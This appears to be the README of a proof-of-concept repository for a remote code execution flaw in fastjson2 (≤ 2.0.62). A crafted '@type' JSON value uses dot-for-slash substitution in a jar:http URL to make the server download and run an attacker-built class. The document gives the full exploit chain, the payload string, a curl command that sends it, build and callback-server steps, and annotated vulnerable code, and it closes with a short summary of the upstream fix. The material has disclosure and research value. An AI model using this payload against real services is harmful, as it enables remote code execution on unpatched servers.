# Fastjson2 ObjectReaderSeeAlso Remote Code Execution

fastjson2 ≤ 2.0.62 RCE via polymorphic deserialization (`ObjectReaderSeeAlso`) + `URLClassLoader.findClass` dots-to-slash substitution, bypassing AutoType whitelist and JDK `ClassLoader.checkName`.

## Affected versions

fastjson2 ≤ 2.0.62, AutoType **disabled** (default).

| JDK | Status |
|-----|--------|
| JDK 8 | ✓ Tested — full RCE |
| JDK 21 | ✓ Tested — full RCE |
| JDK 11/17 | Untested — expected to work |

## Exploit chain

```
POST /api/parse {"@type":"jar:http:..ATTACKER:PORT.exploit!.Evil"}

  JSON.parseObject(body, Animal.class)
    │  Animal has @JSONType(seeAlso={Dog.class, Cat.class})
    │  → ObjectReaderSeeAlso created
    │
    ▼
  ObjectReaderSeeAlso.<init>
    │  super(ObjectReaderAdapter) ← features |= SupportAutoType.mask
    │
    ▼
  ObjectReaderSeeAlso.readObject
    │  SupportAutoType IS enabled (from constructor)
    │
    ▼
  checkAutoType("jar:http:..IP:PORT.exploit!.Evil", Animal.class, features)
    │  features & SupportAutoType ≠ 0 → enabled path
    │  Incremental FNV-1a: none of the prefixes match acceptHashCodes
    │  Hash check FAILS → but SupportAutoType=ON → goto 471
    │
    ▼
  TypeUtils.loadClass("jar:http:..IP:PORT.exploit!.Evil")   ← LINE 561 — DIRECT FALLBACK!
    │  No hash check here — class name goes straight to classloader
    │
    ▼
  ClassLoader.loadClass(name)
    │  checkName("jar:http:..IP:PORT.exploit!.Evil") → no '/' → passes ✓
    │
    ▼
  URLClassLoader.findClass(name)
    │  path = name.replace('.', '/').concat(".class")
    │  path = "jar:http://IP:PORT/exploit!/Evil.class"
    │
    ▼
  URLClassPath.getResource("jar:http://IP:PORT/exploit!/Evil.class")
    │  HTTP GET /exploit → downloads Evil.class from attacker JAR
    │
    ▼
  defineClass("jar:http:..IP:PORT.exploit!.Evil", bytes)
    │  checkName → no '/' → passes ✓
    │  bytecode: "jar:http://IP:PORT/exploit!/Evil" extends Animal
    │  replace('/','.') → "jar:http:..IP:PORT.exploit!.Evil" = name ✓
    │  Animal.isAssignableFrom(Evil) → true ✓
    │
    ▼
  <clinit> executes → Runtime.exec(command) → RCE ✓
```

### Why no hash collision is needed

`checkAutoType` has a SupportAutoType-enabled fallback (line 561):

```java
// fastjson2 ObjectReaderProvider.checkAutoType (simplified)
for (int i = 0; i < typeName.length(); i++) {
    hash ^= typeName.charAt(i);
    hash *= MAGIC_PRIME;
    if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
        return loadClass(typeName);  // hash match → load
    }
}
// Hash did NOT match — what happens next?
if (!SupportAutoType) {
    return null;                    // parse as plain JSON
}
// SupportAutoType IS enabled → fallback!
return TypeUtils.loadClass(typeName);  // LINE 561 — NO HASH CHECK!
```

`ObjectReaderSeeAlso` enables `SupportAutoType` in its constructor. When the attacker's typeName doesn't match any acceptHashCodes (which it won't — default is just 1 hash), the fallback at line 561 loads it directly.

### Why dots matter

JDK `ClassLoader.checkName` rejects binary names with `/`:

```
jar:http://IP:PORT/exploit!/Evil  → checkName fails → NoClassDefFoundError
```

Using dots:

```
jar:http:..IP:PORT.exploit!.Evil  → checkName ✓
         ^^-------^------^       → replace('.', '/') in findClass restores them
```

| Original | Dots version | After replace('.','/') |
|----------|-------------|------------------------|
| `http://` | `http:..` | `http://` |
| `/exploit!/` | `.exploit!.` | `/exploit!/` |

### The Animal subclass requirement

After `loadClass` + `defineClass`, `checkAutoType` verifies `Animal.isAssignableFrom(loadedClass)`. The malicious class MUST extend `Animal` in its bytecode for the assignable check to pass. This is handled by ASM at build time.

## Quick start

```bash
git clone https://github.com/xxx/fastjson2-hash-collision-rce.git
cd fastjson2-hash-collision-rce

# 1. Build (generates exploit JAR extending Animal)
bash scripts/build.sh 127.0.0.1 18080

# 2. Start callback server
python3 poc/server.py 0.0.0.0 18080 &

# 3. Start vulnerable target (JDK 8+)
java -jar target/fastjson-rce-env-1.0.0.jar --server.port=8080 &

# 4. Exploit via ObjectReaderSeeAlso (no hash collision needed)
#    /parseAnimal uses JSON.parseObject(body, Animal.class)
curl -X POST http://127.0.0.1:8080/parseAnimal \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2130706433:18080.exploit!.Evil"}'

# 5. Check OOB output
cat poc/logs/last.txt
```

## Comparison: /parse vs /parseAnimal

| Endpoint | parseObject | ObjectReader | SupportAutoType | Hash check | RCE |
|----------|------------|--------------|-----------------|------------|-----|
| `/parse` | `body, Object.class` | None | OFF (default) | Required | ❌* |
| `/parseAnimal` | `body, Animal.class` | `ObjectReaderSeeAlso` | Auto-enabled | Bypassed | ✓ |

\* `/parse` can work with `addAutoTypeAccept("jar:http:..")` (hash collision demo).

## Key checkAutoType code (fastjson2 2.0.53)

```java
// ObjectReaderProvider.checkAutoType()
//
// Lines 166-170: SupportAutoType flag
// Lines 173-313: Hash checking loop (SupportAutoType=ON path)
// Lines 316-463: Hash checking loop (SupportAutoType=OFF path, with $→.)
// Lines 464-470: SupportAutoType=OFF → return null
// Lines 471-560: getMapping fallback
// Lines 561-565: DIRECT loadClass FALLBACK (no hash check!)

boolean supportAutoType = (features & SupportAutoType.mask) != 0;

// ... hash checking loops (omitted) ...

if (!supportAutoType) {
    return null;   // ← /parse hits this: plain JSON object
}

// SupportAutoType is on — fallback loading without hash verification
Class<?> mapped = TypeUtils.getMapping(typeName);
if (mapped != null) {
    // ... type check ...
    return mapped;
}

// LINE 561: THE DIRECT FALLBACK
clazz = TypeUtils.loadClass(typeName);   // ← NO HASH CHECK!

// ... ClassLoader/JDBC blacklist, assignable checks ...
return clazz;
```

## PR #7695 fix

1. **Text verification**: `acceptNameSet` stores actual prefix strings, checked after hash match
2. **Deny `:` and `!`**: rejects typeNames containing URL-scheme or JAR-entry separators
3. **Deny ClassLoader/JDBC**: blocks `ClassLoader` and `javax.sql` classes

## Files

| File | Purpose |
|------|---------|
| `pom.xml` | Maven project (Spring Boot + fastjson2 2.0.53) |
| `src/main/java/.../Application.java` | Spring Boot entry point |
| `src/main/java/.../Animal.java` | Polymorphic DTO — `@JSONType(seeAlso={Dog,Cat})` triggers ObjectReaderSeeAlso |
| `src/main/java/.../Dog.java` | Animal subclass 1 |
| `src/main/java/.../Cat.java` | Animal subclass 2 |
| `src/main/java/.../ParseController.java` | `/parse`, `/parseAnimal`, `/debug`, `/seereader` endpoints |
| `poc/GenPayload.java` | ASM-based JAR generator (Evil extends Animal) |
| `poc/server.py` | HTTP callback server (serves JAR + OOB output) |
| `scripts/build.sh` | One-shot build + payload generation |

## License

MIT
